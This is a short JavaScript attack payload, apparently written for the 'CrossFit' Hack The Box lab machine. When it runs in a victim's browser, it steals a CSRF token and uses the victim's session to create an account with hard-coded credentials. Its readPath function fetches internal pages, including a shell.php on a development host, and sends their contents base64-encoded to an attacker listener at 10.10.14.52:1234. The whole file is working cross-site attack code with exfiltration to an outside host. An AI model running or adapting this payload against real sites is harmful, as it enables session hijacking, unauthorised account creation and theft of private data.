function createAccount(){
    var LHOST = '10.10.14.52';
    var tryout = new XMLHttpRequest();  
    tryout.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
    tryout.withCredentials = true;
    tryout.send();

    //get the token
    var parser = new DOMParser();
    var responseDoc = parser.parseFromString(tryout.responseText, "text/html");
    var csrfToken = responseDoc.getElementsByTagName("input")[0].getAttribute("value");
    fetch("http://"+LHOST+":1234/?token=" + btoa(csrfToken))


    //try to create an account
    tryout.open('POST', 'http://ftp.crossfit.htb/accounts', true);
    tryout.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    var params = `_token=${csrfToken}&username=zabogdan&pass=zabogdan19&submit=submit`;

    tryout.send(params);

    tryout.onreadystatechange=function() {
        try {
            if (tryout.readyState == 4){
                fetch("http://"+LHOST+":1234/?success=" + tryout.status);
            }
        } catch(error) {
            fetch("http://"+LHOST+":1234/?error=" + btoa(error));
        }
    }
}

function readPath(path){
    var LHOST = '10.10.14.52';
    var tryout = new XMLHttpRequest();  
    tryout.open("GET", path, false);
    tryout.withCredentials = true;
    tryout.send();

    fetch("http://"+LHOST+":1234/?dump=" + btoa(tryout.responseText))
}

// createAccount();
// readPath('http://ftp.crossfit.htb/');
readPath('http://development-test.crossfit.htb/shell.php');